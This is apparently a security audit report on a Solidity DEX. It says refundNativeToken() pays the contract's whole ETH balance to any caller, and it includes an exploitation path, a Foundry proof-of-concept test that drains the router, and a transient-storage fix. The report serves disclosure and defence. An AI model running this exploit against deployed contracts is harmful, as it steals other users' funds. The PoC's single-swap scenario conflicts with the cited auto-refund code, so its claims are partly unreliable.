## Title
Native Token Theft via Accumulated Balance in refundNativeToken()

## Summary
The `PayableMulticallable.refundNativeToken()` function refunds the entire ETH balance of the contract to any caller without tracking which user contributed which amount. This allows attackers to steal accumulated ETH from previous users who sent excess native tokens but didn't call the refund function, as the contracts (Router, Orders, BasePositions) don't prevent ETH accumulation across transactions.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** The `refundNativeToken()` function is designed to refund excess ETH sent by a user within a single multicall transaction where the exact amount needed is difficult to calculate in advance.

**Actual Logic:** The function refunds `address(this).balance` to `msg.sender` without any tracking mechanism to ensure the caller actually contributed to that balance. ETH can accumulate in Router/Orders/BasePositions contracts across multiple transactions when users send excess amounts but don't call the refund function, allowing subsequent callers to steal this accumulated balance.

**Exploitation Path:**

1. **Victim Transaction**: User A calls a payable function (e.g., `Router.swap()`, `Orders.increaseSellAmount()`, or `BasePositions.deposit()`) with `msg.value = 10 ETH` but the operation only requires 8 ETH.

2. **ETH Accumulation**: The contract forwards exactly 8 ETH to Core (ACCOUNTANT) as evidenced by:
   - Router single swaps: [2](#0-1) 
   - Orders operations: [3](#0-2) 
   - BasePositions deposits: [4](#0-3) 
   
   The excess 2 ETH remains in the contract because `BaseLocker.lock()` does not forward `msg.value`: [5](#0-4) 

3. **No Refund Called**: User A doesn't call `refundNativeToken()` (either unaware of the function, doesn't use multicall, or simply forgets).

4. **Attacker Exploit**: User B (attacker) calls `refundNativeToken()` with `msg.value = 0` or minimal amount, and receives the entire `address(this).balance = 2 ETH` (from User A) plus any amount they sent.

**Security Property Broken:** This violates the fundamental security property that users should only be able to withdraw funds they deposited or are entitled to. It enables direct theft of user funds without authorization.

## Impact Explanation

- **Affected Assets**: Native tokens (ETH) sent by users to Router, Orders, and BasePositions contracts for swaps, TWAMM orders, and liquidity deposits.

- **Damage Severity**: Attackers can steal 100% of accumulated excess ETH from all previous users who failed to call `refundNativeToken()`. The contracts have no receive() functions: [6](#0-5)  (no receive defined), meaning ETH only enters via payable functions, making accumulated amounts directly quantifiable.

- **User Impact**: Any user who sends excess native tokens without calling `refundNativeToken()` in the same transaction loses their excess funds to the next caller of the refund function. This affects users who:
  - Don't use multicall batching
  - Are unaware of the refund mechanism
  - Experience transaction failures after sending ETH but before refunding

## Likelihood Explanation

- **Attacker Profile**: Any unprivileged user can exploit this. No special permissions, timing requirements, or capital needed beyond gas costs.

- **Preconditions**: 
  - At least one victim has sent excess ETH to Router/Orders/BasePositions without calling `refundNativeToken()`
  - The contracts have non-zero ETH balance
  - No additional state requirements

- **Execution Complexity**: Single transaction with a single function call. The attacker simply calls `refundNativeToken()` on any of the affected contracts.

- **Frequency**: Can be exploited continuously. Attacker can monitor contract balances and immediately call `refundNativeToken()` whenever balance accumulates. Given typical DEX usage patterns where users may send approximate amounts, this is a persistent threat.

## Recommendation

Track ETH contributions per user using transient storage within multicall contexts or enforce immediate refunds:

```solidity
// In src/base/PayableMulticallable.sol, modify refundNativeToken():

// CURRENT (vulnerable):
function refundNativeToken() external payable {
    if (address(this).balance != 0) {
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }
}

// FIXED Option 1: Track initial balance and only refund excess from current transaction
uint256 private constant _MULTICALL_INITIAL_BALANCE_SLOT = 0x...;

function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
    // Store initial balance before multicall
    assembly {
        tstore(_MULTICALL_INITIAL_BALANCE_SLOT, sub(selfbalance(), callvalue()))
    }
    _multicallDirectReturn(_multicall(data));
}

function refundNativeToken() external payable {
    uint256 currentBalance = address(this).balance;
    if (currentBalance != 0) {
        uint256 initialBalance;
        assembly {
            initialBalance := tload(_MULTICALL_INITIAL_BALANCE_SLOT)
        }
        // Only refund what was sent in this transaction context
        uint256 refundAmount = currentBalance > initialBalance ? currentBalance - initialBalance : 0;
        if (refundAmount > 0) {
            SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
        }
    }
}
```

Alternative mitigation: Automatically refund excess ETH at the end of each operation instead of requiring manual calls, similar to how Router handles single swaps: [7](#0-6) 

## Proof of Concept

```solidity
// File: test/Exploit_RefundNativeTokenTheft.t.sol
// Run with: forge test --match-test test_RefundNativeTokenTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";
import "./FullTest.sol";

contract Exploit_RefundNativeTokenTheft is FullTest {
    address victim = address(0x1111);
    address attacker = address(0x2222);
    
    function setUp() public {
        // Initialize protocol (using FullTest setup)
        // Create a pool for testing
    }
    
    function test_RefundNativeTokenTheft() public {
        // SETUP: Create a pool with liquidity
        PoolKey memory poolKey = createPool({tick: 0, fee: 1 << 63, tickSpacing: 100});
        createPosition(poolKey, -100, 100, 1000 ether, 1000 ether);
        
        // Fund victim and attacker
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 0.01 ether);
        
        // EXPLOIT STEP 1: Victim performs swap with excess ETH (doesn't call refund)
        vm.startPrank(victim);
        uint256 victimBalanceBefore = victim.balance;
        
        // Victim sends 5 ETH but swap only needs ~0.1 ETH
        router.swap{value: 5 ether}(
            poolKey,
            false, // token0 (native) in
            0.1 ether, // small swap amount
            SqrtRatio.wrap(0),
            0,
            type(int256).min
        );
        
        uint256 victimBalanceAfter = victim.balance;
        // Victim lost 5 ETH total, but should have only lost ~0.1 ETH
        vm.stopPrank();
        
        // Check Router accumulated the excess
        uint256 routerBalance = address(router).balance;
        assertGt(routerBalance, 4 ether, "Router should have accumulated excess ETH");
        
        // EXPLOIT STEP 2: Attacker steals accumulated ETH
        vm.startPrank(attacker);
        uint256 attackerBalanceBefore = attacker.balance;
        
        // Attacker calls refundNativeToken with minimal/no ETH
        router.refundNativeToken();
        
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 stolen = attackerBalanceAfter - attackerBalanceBefore;
        
        vm.stopPrank();
        
        // VERIFY: Attacker stole victim's excess ETH
        assertGt(stolen, 4 ether, "Attacker stole accumulated ETH");
        assertEq(address(router).balance, 0, "Router balance drained");
        
        console.log("Victim lost:", victimBalanceBefore - victimBalanceAfter);
        console.log("Attacker gained:", stolen);
        console.log("Vulnerability confirmed: Attacker stole victim's excess ETH via refundNativeToken()");
    }
}
```

## Notes

This vulnerability exists because the protocol assumes `refundNativeToken()` will only be called within the same transaction (via multicall) by the user who sent the ETH. However, there is no enforcement mechanism:

1. The contracts inherit from PayableMulticallable: [8](#0-7) , [9](#0-8) , [10](#0-9) 

2. `refundNativeToken()` is a public external function callable by anyone at any time, not restricted to multicall contexts.

3. No sweep/rescue functions exist in these contracts to recover stuck funds.

4. While Router single swaps have automatic refund logic, multihop swaps, Orders operations, and BasePositions deposits do not: [11](#0-10) 

5. The comment on FlashAccountant explicitly notes it cannot be multicallable due to msg.value handling: [12](#0-11) , highlighting the sensitivity of native token accounting in delegatecall contexts.

### Citations

**File:** src/base/PayableMulticallable.sol (L1-30)
```text
// SPDX-License-Identifier: ekubo-license-v1.eth
pragma solidity >=0.8.30;

import {Multicallable} from "solady/utils/Multicallable.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

/// @title Payable Multicallable
/// @notice Abstract contract that extends Multicallable to support payable multicalls and ETH refunds
/// @dev Provides functionality for batching multiple calls with native token support
///      Derived contracts can use this to enable efficient batch operations with ETH payments
abstract contract PayableMulticallable is Multicallable {
    /// @notice Executes multiple calls in a single transaction with native token support
    /// @dev Overrides the base multicall function to make it payable, allowing ETH to be sent
    ///      Uses direct return to avoid unnecessary memory copying for gas efficiency
    /// @param data Array of encoded function call data to execute
    /// @return results Array of return data from each function call
    function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
        _multicallDirectReturn(_multicall(data));
    }

    /// @notice Refunds any remaining native token balance to the caller
    /// @dev Allows callers to recover ETH that was sent for transient payments but not fully consumed
    ///      This is useful when exact payment amounts are difficult to calculate in advance
    ///      Only refunds if there is a non-zero balance to avoid unnecessary gas costs
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
}
```

**File:** src/Router.sol (L52-52)
```text
contract Router is UsesCore, PayableMulticallable, BaseLocker {
```

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L134-142)
```text
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
```

**File:** src/Router.sol (L229-230)
```text
                    if (specifiedToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(totalSpecified)));
```

**File:** src/Orders.sol (L24-24)
```text
contract Orders is IOrders, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```

**File:** src/Orders.sol (L147-148)
```text
                    if (sellToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
```

**File:** src/base/BasePositions.sol (L29-29)
```text
abstract contract BasePositions is IPositions, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```

**File:** src/base/BasePositions.sol (L256-257)
```text
                if (amount0 != 0) {
                    SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
```

**File:** src/base/BaseLocker.sol (L61-61)
```text
            if iszero(call(gas(), target, 0, result, add(len, 4), 0, 0)) {
```

**File:** src/base/FlashAccountant.sol (L387-388)
```text
        // Note because we use msg.value here, this contract can never be multicallable, i.e. it should never expose the ability
        //      to delegatecall itself more than once in a single call
```
